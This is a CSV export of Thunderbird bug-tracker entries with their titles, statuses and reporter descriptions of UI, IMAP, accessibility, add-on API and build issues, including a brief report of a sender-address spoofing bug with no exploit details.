1615229,High cpu used by thunderbird when idle,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36 Steps to reproduce: Environment: Ubuntu 18.04 LTS Thunderbird 68.5.0 (64 bit) installed from ppa:mozillateam/ppa (latest stable) Actual results: Sometimes happens that TB is opened and my PC fan starts to revs a lot. Looking at system monitor TB is guilty of high CPU usage and when I close it cpu (and fan) comes back to normal. Pretty strange since TB windows is in background, I keep it open to be notified by new emails. Expected results: Thunderbird is working normally, checking emails with normal CPU/Memory footprint."
1615238,drag and drop attachments into file browser creates .desktop file (KDE),RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Drag and Drop attachment into Dolphin/Krusader window. Actual results: The only option offered is ""Link here"" This creates a .desktop file Expected results: The actual attachment should be saved."
1615341,Icon on Win10 taskbar didn't work after update,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Thunderbird [Win10] did automatic update installation. Actual results: The Thunderbird icon on the taskbar was no longer valid to start Thunderbird. Not a big deal. Removed the icon from the taskbar and repinned it from the desktop icon. Expected results: Left the icon unchanged.
1615377,Drop-down selector arrows have a border on the left side,RESOLVED,--,WORKSFORME,"While testing Thunderbird 74.0b1 on Linux I noticed that there is a border to the left of the arrow wherever a drop-down selector exists. This one is for the calendar event creation dialog window. I also noticed this when testing on Windows 10, but just thought it was misaligned. I notice it doesn't exist using Thunderbird 68.5.0."
1615439,missing emails when moving between folders,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36 Steps to reproduce: This issue is intermittent and has been happening for the last two or three months. If I use drag and drop to move mail in the junk folder back into the inbox in my IMAP account when I haven't yet assigned that address to the safe list it sometimes disappears. It is not guaranteed to reproduce. Actual results: The email is actually moved correctly into the inbox on the server but fails to appear in the inbox on the PC even after new emails are later downloaded. On some occasions, but not all, it will appear in the inbox much later. On some occasions it later appears still in the junk box on the PC whereas it is in the inbox on the server. Expected results: The moved email should be quickly moved to where I dragged and dropped it. I have a suspicion that the issue may be related to occasional slow server performance and Thunderbird forms a list of emails in each folder which for some reason remains out of sync with that on the server."
1615468,Address autocomplete feature doesn't work in TB 74 beta and TB Daily 75 on Mac when Mac address book is enabled,RESOLVED,P1,FIXED,"Install Thunderbird 74.0b1 or Thunderbird Daily 75.0a1 and create a email account. Open a new compose window, begin to type a name or an address in the address field. Expected behavior: normally TB would open a drop-down pane with a list of email addresses for autocompletion Observed behavior: the typed characters in the address field always appear in red and no drop-down pane is displayed even though the Mac OS X Address Book is activated. The issue is the same if one uses another address book containing the same contacts , e. g. the Personal Address Book."
1615494,"C-C TB uninitialized memory access during xpcshell-test, mailnews/import/src/nsImportService.cpp fails to initialize clsID fields.",RESOLVED,--,FIXED,"I thought I filed this before, but failed to do so obviously. There is yet another uninitialized memory access during xpcshell-test execution under valgrind. I am attaching a summary extracted from a local log file. Extraced by: ``` egrep -i -1 ""(TEST_FILE|TEST_NAME|uninitialis)"" log1164-xpcshell-memcheck.txt > /tmp/clsID-bug.txt ``` You can find the name of the tests that caused the uninitialized memory access by backtracking several lines where valgrind reported uninitialized memory access. All the uninitialized memory access happened to memory allocated in a single function: ``` nsImportService::LoadModuleInfo(char const*, char const*) (nsImportService.cpp:367) ``` I will post a patch that initializes the memory in the said function. This uninitialized memory access may happen because bcmp (strcmp, etc.) may access memory in 8 or 4 octets at a time, but I don't think it is a good idea to leave some key fields uninitialized and thus zero'ed them."
1615679,Small regressions in Preferences UI styling,RESOLVED,--,FIXED,"The `html:fieldset` comes with an inline padding which is indenting the content in the Preferences panel. `html:legend` section titles also have a `font-weight` attribute `bold`, but it should be `600` to respect what we had before."
1615681,Subject column has disappeared in Search results list,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Used OSX (command-K) search window Selected 'open email as list' option from results window Actual results: 'open email as list' results' list displayed without Subject column. Subject column also not available from drop down options (see screenshot) Expected results: 'open email as list' results' list including Subject column displayed
1615688,Drop down menu buttons are collapsed with no down arrows,RESOLVED,--,FIXED,"I first noticed this in calendar event dialogs (shown in screenshot), but have also seen it in other places, so it appears to be all drop down menu buttons."
1615699,[autoconfig] Dropdowns missing in manual edit mode,VERIFIED,--,DUPLICATE,"Environment: * Linux, Ubuntu * Custom GTK theme * Thunderbird from 2020-02-12, self-built Reproduction: 1. Open Account Creation Dialog 2. Enter foo@uzuzuzuzuzuzuzuzu.com as email address, and any password Actual result: 1. You drop into the manual edit mode (correct) 2. Port is prefilled as ""Auto"" (correct) 3. The dropdown on the right of the field is lacking the down arrow icon. (the bug here) 4. Same for the SMTP server hostname. 5. The dropdown buttons are actually functional and working as intended. It's just the icon missing and the width too small. 5. The SSL, Authentication and Protocol dropdowns have the down arrow, but also a white vertical line next to the down array, and too close to it. Expected result: 1. The editable dropdowns have the down arrow icon 2. The non-editable dropdowns do not have a while vertical line."
1615714,hiddenwindow errors on macOS with chat,RESOLVED,--,FIXED,"I'm not able to connect to an IRC server with Thunderbird 74.0b1-build3. The Developer tools console has errors referring to ""hiddenwindow.jsm"". Same test on Linux worked."
1615774,Thunderbird 68.5.0esr doesn't open URIs,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.3; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: 1) Open Thenderbird 68.5.0esr 2) Kill explorer.exe process in Task Manager 3) Open an e-mail containing links (for example to imgur.com) 4) Click the blue link Actual results: 5) The link is violet but no action is done. In Console: ```NS_ERROR_FAILURE: Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsIExternalProtocolService.loadURI] contentAreaClick.js:230 openLinkExternally chrome://communicator/content/contentAreaClick.js:230 contentAreaClick chrome://communicator/content/contentAreaClick.js:200 onclick chrome://messenger/content/messenger.xul:1``` Expected results: 5) if browser is not run, the browser should be run. 6) new tab with imgur.com should be visible. My company uses windows shell replacement. The minimal test is killing the explorer.exe and trying to open a link. Last correctly working version is 68.2.0esr. We must migrate to other mail-client due to not corrected bug (not working basic functionality) and new security issues from 68.3.0 to 68.5.0. Changes starting from 68.3.0 (not working attachments) and 68.3.1 (not working URIs) is any misunderstandin"
1615775,Page give.thunderbird.net is semi-translatable,RESOLVED,--,INVALID,"The following strings are in English while the rest of the page is translatable. 1. Give to Thunderbird 2. We’re the leading open source cross-platform email and calendaring client, free for business and personal use. By contributing you’ll help ensure it stays that way and contribute towards future development. Will you give today? 3. Update: Contributions are no longer being received by Mozilla Foundation and will not be tax deductible as charitable contributions. The page should be completely translated."
1615785,"Search results list in ""Advanced Search"" no longer accessible for screen readers",UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: 1. Launch a screen reader like NVDA or Narrator. 2. Open Thunderbird with at least one e-mail/feeds account in it. 3. Select a folder from the pane on the left. 4. Open the ""Advanced Search"" window (e.g. by pressing Control+Shift+F). 5. Perform a search for something, which you know will return at least a few results. 6. When the search is complete, use TAB to go to the list of results. 7. Use the up/down arrow keys to navigate between the search results. Actual results: The screen reader does not report the currently selected list item. Expected results: The screen reader should report each list item, when it is selected."
1615787,Folders pane is inaccessible for screen readers on first launch after an update of Thunderbird,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: 1. Launch a screen reader like NVDA or Narrator. 2. Update Thunderbird via its ofline installer to a 68.x build. Do not install the ""Maintenance Service"" feature. I don't know if the ""ofline installer"" or ""Maintenance Service"" details matter, but that is how I update Thunderbird. 3. On the final screen of the installer, select to launch Thunderbird after the installer is closed. 4. Activate the ""Finish"" button and wait for Thunderbird to launch. Actual results: Screen readers like NVDA and Narrator fail to read the items in the folder pane on the left, until Thunderbird is closed and reopened again. Expected results: Screen readers like NVDA and Narrator should read the items in the folder pane, even on the first launch of Thunderbird after its update."
1615829,Forward as Attachments freezes Thunderbird for a few minutes with high memory when used on 201 emails,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: 1. Press ctrl+A in folder with a very large number of emails 2. Right click 3. Select the top option ""Forward as Attachments"" I triggered this bug accidentally because the item is the top one in the right-click menu. In my case the folder had 201 emails. Actual results: Thunderbird completely freezes for several minutes using up several gigabytes of RAM. Once it finishes an ordinary new email dialog with a lot of attachments is opened, and I can quit it normally. The RAM usage went down again when the new email dialog opened. In my case there were 201 emails in the folder. Expected results: An error dialog or loading bar should have shown up, or perhaps it plain shouldn't have taken very long. It seems like it is doing something very inefficient in the process of creating the attachments, because it used several gigabytes of RAM to create 11 MB of attachments from 201 emails."
1615833,IMAP Yahoo subscribed folders only show new messages on Thunderbird launch,RESOLVED,--,DUPLICATE,"Using IMAP on Yahoo mail any added subscribed folders (added via the web interface at Yahoo that have mail filtered into them by Yahoo (set on the web). These folders are set to check for new messages in this folder, only update the message count on Thunderbird launch. They sometimes display a message count yet clicking the folder shows zero messages. Closing and reopening Thunderbird will then display the messages in that folder. Yahoo Trash also behaves this way. Clicking a folder or double-clicking it does not update the folder contents. This is W10 latest 1909 and all updates, and Thunderbird is the 32-bit version."
1615837,Disappearing icons in message list,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36 Steps to reproduce: From time to time run TB as always. Actual results: Sometimes the message list is missing icons on the left side. The missing icons are: starred message, attachment icon and replyed to the message icon. Whole columns of icons are empty. Didn't noticed when it happens. Expected results: Icons should be always visible."
1615847,Prevent installation of addons except through the addon manager or an approved addon policy for corporate use..,RESOLVED,--,DUPLICATE,"Currently, we have third-party software installing addons in Thunderbird. This varies from antivirus products inserting their own versions of SPAM and SCAM filtering to password managers. Having other software randomly insert their own code into Thunderbird without the user explicitly making some sort of authorization in Thunderbird leads to confusion, where Thunderbird is blamed for things it is not involved it. This also represents a significate point of penetration for malware into Thunderbird as it can be installed without user involvement and subsequently significantly impact on their privacy, being able to undertake any action an extension can undertake. (CC copies of every business email to a third party). I am not a fan of addon signing, but a mechanism is required to protect the user from third party products modifying Thunderbird without relevant permissions being granted."
1615849,"addon manager ""flickers"" and displays incorrect information before updating to correct information.",RESOLVED,--,WONTFIX,"I have attached, or will after I get the second image uploaded the initial flicker displayed and the final display post flicker. There should not be a flicker should incorrect information at all."
1615877,autoconfig strips leading zeros from numerical usernames,NEW,--,,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: tried to add a mail account for martin.sluka@mensasandbox.de Actual results: Thunderbird detects username 497731 for IMAPS and SMTPS. Expected results: Thunderbird detects username 0497731 cmp. https://autoconfig.mensasandbox.de/mail/config-v1.1.xml?emailaddress=martin.sluka%40mensasandbox.de
1615904,Wrong message threading with correct message-id/in-reply-to chain,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: I received an email and replied to it, starting a thread with 7 messages and two people. Actual results: The messages are not threaded in the expected way but the references and in-reply-to headers seems to be correct. As you can see in the attachment, instead of one thread I've got two thread and a single message. Expected results: The correct threading. I've got this kind of issue very often."
1615907,Global search box should have a blue focus border when focused,RESOLVED,--,FIXED,"STR 1) main 3 pane, click to focus Global Search input box (""Search..."") 2) for comparison, click to focus Quick Filter input box (""Filter these messages..."") Actual 1) global search box has cursor, but no other visual indication of focus (this bug) 2) Quick filter box has cursor and blue border around the input box Expected 1) global search input should have blue border when focused, same as quick filter Also, whilst the 1px blue border is very elegant, it's pretty hard to spot. Maybe it doesn't have to be as striking as the current focus in account-settings-Auto-BCC-input (2px focus border, 2px light-blue shadow), but some middle ground between the two extremes would be good, e.g. complementing the 1px solid focus border with some sort of lighter shadow which emphasises where the focus is. A clear indication of focus is definitely helpful between dozens of elements on the screen."
1615926,windows.getCurrent and windows.getLastFocused ignore window type arguments,RESOLVED,--,FIXED,These functions take a `getInfo` argument which theoretically allow the caller to specify a window type or types. The window type argument is ignored.
1615995,Account name missing in 'Add Security Exception page',UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: Over the weekend my thunderbird started to ask me for 'Add Security Exception'. The name of the domain in question did show up - but I have 4 email accounts for this single domain I maintain from my Thunderbird. My provider gave me a hint what the problem might be and I changed the credentials (mailserver) for one the accounts. Does it work now? I do not know, as the there are still popups 'Add Security Exception' (I assume from the not adapted accounts) - but there is no way to verify this. Actual results: Message pops up but does not refer to which mail-account it belongs. Expected results: There should be not only the domain name but also the user name of the mail account."
1616070,Messages keep downloading and preferences are not saved,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I use Thunderbird to get mail from a POP server already for many years without problems, but since a couple of months: - Thunderbird keeps downloading messages already retreived earlier as I leave message for 30 days on the POP server. - preferences like unchecking ""Check for new messages every .. minutes"" are not saved. - message filters are not saved. Architecture: Client is Windows 10 Enterprise, File server (where the profile is stored with mailboxes, prefs etc.). is a Ubuntu. Nothing changed last half year on the Ubunut system, so it has to be a client side problem. I tried several hints on the forums, like delete popstate.dat, remove .msf files, but nothing helped. I even copied one profile to a Windows PC, did a cleanup (popstate.dat, msf), everything worked OK, but after placing a copy of this profile back on the network, the troubles were back. Actual results: I see shortly a postate-1.dat appearing when downloading new messages and after downloading this file disappears again and the postate.dat stays unchanged. Expected results: File popstate.dat should have bee"
1616100,TEST-UNEXPECTED-FAIL | comm/mail/test/browser/composition/browser_newmsgComposeIdentity.js | Uncaught exception received from previously timed out test - popupshown listener on #msgIdentityPopup not removed before the end of test,RESOLVED,P5,WORKSFORME,**Filed by:** mkmelin+mozilla [at] iki.fi **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=289250123&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/XPxpGCbRQ9CmGS99U1nNqw/runs/0/artifacts/public/logs/live_backing.log ---
1616114,skiptrash in browser.messages.delete allows silent delete of mailbox messages,RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (Windows NT 10.0; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: maybe have an addon trash where these messages go? So that the user might be able to recover them? Some of the 'security restrictions' for addons truely feel silly, but this feels like a serious risk. I would not have an addon delete my full mailbox - even if only by accident and putting a bad loop end into its code. There are valid use cases for skiptrash, so maybe an addon specific trash would be good, which the user can clear if the addon works fine."
1616143,browser/compose/messageDisplayAction buttons can't be customised on a per-tab basis,RESOLVED,--,FIXED,The API accepts a tab ID when setting properties on action buttons. For some reason we never implemented this.
1616192,Main context menu can't handle shadow DOM,RESOLVED,--,FIXED,"When a document contains elements with shadow DOM, the context menu behaves as though the click happened on the outer element, not the inner one. For example, if a <div> has a shadow DOM <a> child, and the user right-clicks on the <a>, the options for opening a link do not appear."
1616246,LDAP autoconfig not working,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Steps to reproduce: In my autoconfig script (MCD) i'm using the getLDAPAttibutes function from prefcall.js but from 68.3.0 the returned value is always null. I know the signature of this function has recently changed for support of LDAPS. old: getLDAPAttributes(host, base, filter, attribs) new: getLDAPAttributes(host, base, filter, attribs, isSecure) See also https://developer.mozilla.org/en-US/docs/Archive/Misc_top_level/MCD,_Mission_Control_Desktop_AKA_AutoConfig https://searchfox.org/mozilla-central/source/extensions/pref/autoconfig/src/prefcalls.js Actual results: Here is how i use this function: getLDAPAttributes(""ldap.example.com"", ""ou=people,o=example.com,dc=example,dc=com"", ""uid=""+user.username, ""cn,mail,givenName,sn,displayName,preferredLanguage,icsSubscribed"",0); and the debugging output is: [(null) 29509: Main Thread]: D/LDAP nsLDAPOperation::SimpleBind(): called; bindName = ''; [(null) 29509: Socket Thread]: D/LDAP pending operation added; total pending operations now = 1 [(null) 29509: Socket Thread]: D/LDAP pending operation removed; total pending operations now = 0 [(null) 29509: Main Th"
1616269,"""Get All New Messages"" and ""Automatically download ..."" does not get new mails of POP3 OAuth2 authenticated accounts",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: User Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Thunderbird/68.5.0 Thunderbird 68.5 (32bit) on Windows 10 (64bit) Home version 1909 I changed the authentication method in TB 68.5 for all my Gmail, Yahoo and AOL accounts (SSL/TLS security) from POP3 ""Normal password"" to POP3 OAuth2. I tried to get messages with ""Get All New Messages"", Shift+F5 and ""Automatically download new messages"", Read/Get messages by account, and with ""Check for new messages at startup"" at startup. Actual results: ""Get All New Messages"", Shift+F5 and ""Automatically download new messages"" doesn't get any messages. No problem with Read/Get messages by account, and with ""Check for new messages at startup"" at startup. Expected results: We should receive messages in every case."
1616387,[esr68 only] thunderbird account settings textbox has limited input space,RESOLVED,--,FIXED,User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: 1) thunderbird 68.5 on Windows 7 2) Open account settings 3) try to change server settings Actual results: * textbox has limited input space * cannot set cursor by mouse to end of textbox content Expected results: Text flows to textbox width
1616501,MailExtensions: API to interact with message header,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Please add an API to interact with message header. Add-on support: As of version 74.0 beta, Thunderbird only supports MailExtensions and MailExtension Experiments. Restartless add-ons and non-restartless legacy add-ons using XUL overlays are no longer supported. https://www.thunderbird.net/en-US/thunderbird/74.0beta/releasenotes/ Add-ons (in alphabetical order): * CardBook https://addons.thunderbird.net/addon/cardbook/ Manage Contacts from the Message Header * CompactHeader https://addons.thunderbird.net/addon/compactheader/ * Display Contact Photos https://addons.thunderbird.net/addon/display-contact-photo/ * Display Mail User Agent https://addons.thunderbird.net/addon/display-mail-user-agent-t/ What do you think? Thank you Actual results: ### Getting your API added to Thunderbird https://thunderbird-webextensions.readthedocs.io/en/latest/how-to/experiments.html#getting-your-api-added-to-thunderbird If you think your API would be useful to other extensions, consider having it added to Thunderbird. File a bug that blocks bug 1396172 and add your schema and implementation fil"
1616572,"move filter for imap account working locally only, no move seen in other imap clients",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: imap account, two clients. TB1 filter moves email with subject ""*** spam ***"" (without the spaces) from inbox to subfolder 'a spam'. Successful. Hours later, TB2 displays these messages still in inbox. Both TB1 and TB2 are set to sync and to keep messages locally. Manual moving of messages is reflected in both TB1 and TB2 (email is in same folder on both instances). Expected results: If TB1 moves an email to a subfolder, TB2 should update latest at next message download. I don't know whether TB2 would monitor the subfolder, but the email is gone from inbox in TB1, that should be reflected in TB2 as well."
1616581,Richard crash without crash report generated [meta],RESOLVED,--,WORKSFORME,"Following upgrade to Thunderbird 74.0b1 (32-bit) it has crashed unexpectedly 3-4 time this week without generating crash report or proposing to report the issue... I had to manually start application again. When if first occurred, I thought I had perhaps closed it by mistake, but last it happens (just now) it was after clicking the Send button to send a message... previously I was not doing anything in particular in TB, it just seem to crash by itself... It is probably expected from a b1 version but just thought to mention it... After a manual start of TB, the message appeared send and available in Sent items folder... on the server (IMAP/SMTP account)."
1616626,Thunderbird Crashes (OOM?) when copying many emails to another inbox. Mac @ _platform_memmove$VARIANT$Haswell | <name omitted> | nsBufferedInputStream::Read,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36 Steps to reproduce: 1. Select mailbox from my local folders 2. Drag mailbox into an existing folder of an IMAP account I have linked in Thunderbird (a Gmail) account Actual results: It begins copying the emails to the inbox, however around 1000 emails in Thunderbird crashes Expected results: Emails copy properly to the appropriate inbox"
1616753,"Global Search: Attachments type subfilters return no results; then attachments facet disappears after two clicks, making the search no-op.",ASSIGNED,P2,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Step to produce : step 1 search some key word. step 2 change filter attachment to some other option step3 click attachment collapses attachment step4 click again attachment. it will disappear. Actual results: No filtering happens in 74.0b1. If select any other option documents, pdf etc and click somewhere else, from me buttons & to me buttons, total attachment option disappear as seen screen shot. for me, other than ""any kind"" yield 0 results."
1616764,Subject line no longer wraps in TB 74b1,RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Upgraded to 74 beta 1. Theme is default. No extensions are enabled at all, and those that were before the great WebExtensions purge were non-display related ones, like EnigMail, StartupMaster, and Remove Duplicate Messages. HiDPI but everything else reflows just like usual. Actual results: Long subject lines now run into the date/time field and beyond, instead of wrapping. Expected results: Long subject lines should wrap and create multiple lines when the area is too small."
1616826,Repeated redirects when trying to login,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: When i try to login outlook.com microsoft is detecting multiple redirects and logging me out. this holds good for the browser too
1616917,new mail notification - no correlation between email count and displayed messages on imap,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: new mail notification box appears and shows: Actual results: a) you have 1 new message (displaying 6,3,4,8,whatever) b) you have 4 new messagrs, displaying 2 messages any combination of that. No correlation between the count given and the number of displayed messages generally, all messages seem to be new to me, but they are not counted? and most recently, the notification box cannot immediately be disposed with x, it insists to be displayed a few seconds. Expected results: if there are 5 messages, the count should be 5. if it announced 1 new message but displays 6, which is supposedly the new one? top one, bottom one, middle one? which folders does it use for counting and displaying on imap, inbox only or including others?"
1616962,delivery status notification does not work with Thunderbird v68.5,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36 Steps to reproduce: 1- Writing a message with Thunderbird x64 V68. 2- Selecting from the ""options"" menu ""return receipt"" AND/OR ""delivery status notification"". 3- Sending message. Actual results: I am not receiving either of these expected responses. Note 1: When self-testing by sending to oneself a message with either or both options enabled. The result is that you will receive your email but none of the 2 notifications. Note 2: This problem exist on Thunderbird x64 v68, but the Thunderbird x32 v68 works correctly. Expected results: 1- Notification of delivery success or failure from the network provider. 2- A ""read notification"" from the addressee if he/she wishes to reply to the ""return receipt"" request."
1616978,When opening Thunderbird it returns to the last search results.,RESOLVED,--,WORKSFORME,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Open Thunderbird. Actual results: It showed the last quick search results. Expected results: Show the state when I closed it: normal Inbox.
1616988,"""Insert link"" dialog box split across two monitors when TBird running in external monitor.",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Have two monitors. Open TBird in external monitor only. Compose new email. Select text and then insert>link to make it a clickable link. Dialog box should come up centered in TBird window. Instead it comes up centered across entire two-monitor desktop, split across two monitors. Dragging box to one window and completing ""insert link"" process does not cause preferences to remember dialog box location. Is always wrong each time insert-link is chosen. Actual results: If I run Tbird in native laptop display, dialog box is at far left edge of screen, with external monitor it spans both monitors. Expected results: Dialog box should be centered within the window the email is being composed in regardless of which monitor Tbird is displayed in."
1617022,compose.onBeforeSend listener doesn't actually change composed message,RESOLVED,--,FIXED,"Due to a series of mistakes, trying to change a message with an onBeforeSend listener doesn't actually do anything. This needs proper automated tests."
1617109,All columns disappear in message list for Inbox. And unable to restore subject column.,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: No idea what actually triggered it. Actual results: Suddenly the entries for the Inbox for one of my IMAP email accounts appeared all blank. Or rather, there was one blank line for each message, and the heading line was also blank. All other folders and accounts were OK. Right-clicking in the heading line showed no columns displaying. I could restore the tag for all fields, except for the Subject line which does not appear as an option (I assume this is by design). I tried restarting in safe-mode, with all variants, including resetting settings and plugins, but no joy with either combination. The one inbox still shows no subject line. Expected results: The columns for my Inbox should have been kept as is."
1617130,Global search is totally broken in 68.4.1,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Global Search for a word that IS present in some emails FYI: ThB 68.4.1 in Xubuntu 19.10 freshly dist-upgraded FYI: I tried it in safe mode too. Actual results: The list of resulting emails appears, but clicking on emails to open them is broken: for some results, it opens a blank page, for others it opens a totally unrelated email... As can be seens in the image, clicking first result leads to opening of a blank page... Expected results: Clicking on one of the result should open the corresponding email! If this is a local problem (some kind of index has been broken during an update), I would love to have a work-around so that I don't have to reconfigure a new fresh account from start..."
1617284,windows 10 start application with shared profile fails after update to 68.5.0 on fedora,RESOLVED,--,INVALID,"environment: dual boot windows 10 and fedora 31 windows has Thunderbird 68.4.2 fedora has Thunderbird is 68.4.1 Both Thunderbird applications using the same profile on a data partition (ntfs) /mnt/my_data_drive/Thunderbird/profile I installed an update in Fedora for a new version of Thunderbird (68.5.0) I was able to access and use the shared Thunderbird profile on fedora. When I started windows and try to start Thunderbird, A window pops up saying: ""A newer version of Thunderbird may have made changes to you profile which are no longer compatibles with this older version. Use this profile only with that newer version, or create a new profile for this installation of Thunderbird."" So I updated windows Thunderbird to 68.5.0. I still get the window message above. I then reinstalled the prior version of Thunderbird on Fedora. I can now access and use the shared profile on both systems. So I tried again, this time Windows Thunderbird is at 68.5.0. When I install the Thunderbird 68.5.0 on fedora, which works fine, Then I reboot and try to start Thunderbird on windows , I still get the message above, even though both Thunderbird installations are 68.5.0. I created a new profile, set up a"
1617299,DisplayUtils.getCardForEmail virtually duplicates GlodaUtils.getCardForEmail,NEW,--,,`DisplayUtils.getCardForEmail` and `GlodaUtils.getCardForEmail` are near-duplicates and could probably be consolidated into one to save confusion with similar functions with not quite the same signature. https://searchfox.org/comm-central/rev/631e8b52544ba72abc8a1ab9551a57f3a6441960/mailnews/db/gloda/modules/GlodaUtils.jsm#90-106 https://searchfox.org/comm-central/rev/631e8b52544ba72abc8a1ab9551a57f3a6441960/mail/base/modules/DisplayNameUtils.jsm#28-51
1617370,Sender Email Address Spoofing by encoded extraneous white space in display name,RESOLVED,--,FIXED,"+++ This bug was initially created as a clone of Bug #1506587 +++ By abusing Unicode whitespaces (e.g., U+3000) within the 'From:' email header, an attacker can spoof the sender email address when displayed by the Thunderbird mail client. Turns out bug 1506587 didn't fix the case where the special characters are encoded. Testcase in attachment 9128245."
1617371,comm/mailnews/base/src/nsMailDirProvider.cpp:170:22: error: no member named 'GetSelectedLocale' in 'nsIXULChromeRegistry',RESOLVED,--,FIXED,Most probably busted by bug 1616912. A build with the parent changeset is successful locally.
1617379,WebExtension experiments don't have access to the addressBookCache,RESOLVED,--,FIXED,"As far as I can tell, the extension context doesn't make the `addressBookCache` available. This makes it hard for authors to design experiment APIs where we pass in the contact id."
1617391,unnecessary full macOS build when requesting --artifact,RESOLVED,--,WORKSFORME,"When requesting a try build with syntax ```try: -b o -p win64,linux64,macosx64 -u none --artifact``` in addition to a macOS ```Ba```, a regular full ```B``` build is started. Intentional or bug? Should the B build be suppressed? For example: https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&revision=435783ede368d7e6bce4df53a40549bc40a88da6"
